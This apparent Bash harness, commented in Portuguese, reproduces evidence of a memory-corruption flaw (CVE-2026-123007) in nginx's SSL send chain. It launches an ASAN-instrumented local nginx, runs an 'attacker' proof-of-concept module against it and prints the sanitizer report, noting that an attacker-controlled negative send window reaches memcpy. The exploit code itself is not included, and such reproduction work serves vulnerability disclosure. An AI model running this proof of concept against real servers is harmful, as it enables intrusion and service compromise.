#!/usr/bin/env bash
# Reproduz a evidencia de corrupcao de memoria do CVE-2026-123007.
#
# Sobe um alvo nativo compilado com AddressSanitizer (porta 8444),
# executa a cadeia com acelerador e imprime o relatorio do ASAN:
#
#   ERROR: AddressSanitizer: negative-size-param (size=-1073741824)
#     #1 ngx_ssl_send_chain src/event/ngx_event_openssl.c:3150
#
# O primeiro build leva 1-2 minutos. Depois e' instantaneo.
#
# Uso: ./scripts/rce-evidence.sh [--rebuild]
set -uo pipefail

PROJECT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$PROJECT"

PORT="${N2R_ASAN_PORT:-8444}"
ROOT="$PROJECT/.n2r-asan"
LOG="$ROOT/run.log"

if [ "${1:-}" = "--rebuild" ]; then
    rm -rf "$ROOT"
fi

if ss -ltn 2>/dev/null | grep -q ":$PORT "; then
    echo "[n2r] porta $PORT ja esta em uso; use N2R_ASAN_PORT=outra"
    exit 1
fi

echo "[n2r] subindo alvo ASAN na porta $PORT"
N2R_ASAN=1 N2R_PORT="$PORT" ./scripts/native-up.sh >"$LOG" 2>&1 &
UP_PID=$!

cleanup() {
    kill "$UP_PID" 2>/dev/null
    # native-up.sh usa exec: o PID e' o proprio nginx
    pkill -f "nginx-1.31.8/objs/nginx .*$ROOT" 2>/dev/null
    rm -f "$ROOT/nginx/logs/nginx.pid"
}
trap cleanup EXIT

for _ in $(seq 1 240); do
    ss -ltn 2>/dev/null | grep -q ":$PORT " && break
    kill -0 "$UP_PID" 2>/dev/null || { echo "[n2r] o alvo nao subiu"; tail -5 "$LOG"; exit 1; }
    sleep 1
done

if ! ss -ltn 2>/dev/null | grep -q ":$PORT "; then
    echo "[n2r] timeout esperando a porta $PORT"
    exit 1
fi

echo "[n2r] atacando (--accelerate)"
( cd attacker && python3 -m poc --no-banner run \
    --host 127.0.0.1 --port "$PORT" --accelerate ) || true

sleep 1

echo
echo "══════════════════════ evidencia do ASAN ══════════════════════"
REPORT="$(grep -aA 22 'ERROR: AddressSanitizer' "$LOG" | head -n 30)"
if [ -z "$REPORT" ]; then
    echo "[n2r] nenhum relatorio do ASAN encontrado."
    echo "      veja $LOG"
    exit 1
fi
printf '%s\n' "$REPORT" | sed -E \
    -e 's/^(.*ERROR: AddressSanitizer.*)$/\x1b[38;5;203m\1\x1b[0m/' \
    -e 's/^( *#[0-9]+ .*)$/\x1b[38;5;245m\1\x1b[0m/' \
    -e 's/^(SUMMARY:.*)$/\x1b[38;5;221m\1\x1b[0m/'
echo "════════════════════════════════════════════════════════════════"
echo
echo "Leitura: memcpy recebeu size = -N (convertido para size_t ~ 2^64)."
echo "N veio do send_window negativo, que o atacante controla."
echo "Isto e' corrupcao de memoria, nao um simples ponteiro nulo."
